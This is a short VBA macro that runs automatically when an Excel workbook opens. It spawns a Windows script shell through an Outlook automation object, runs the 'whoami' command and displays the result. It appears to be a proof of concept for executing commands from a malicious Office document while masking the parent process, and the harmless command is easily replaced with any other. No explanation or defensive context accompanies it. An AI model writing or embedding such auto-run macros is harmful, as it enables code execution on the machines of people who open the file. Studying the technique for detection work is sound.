
```
Sub Workbook_Open()

	Set objOL = CreateObject("Outlook.Application")

	Set WshShell = objOL.CreateObject("Wscript.Shell")

	Set WshShellExec = WshShell.Exec("whoami")

	MsgBox (WshShellExec.StdOut.ReadAll)

End Sub
```
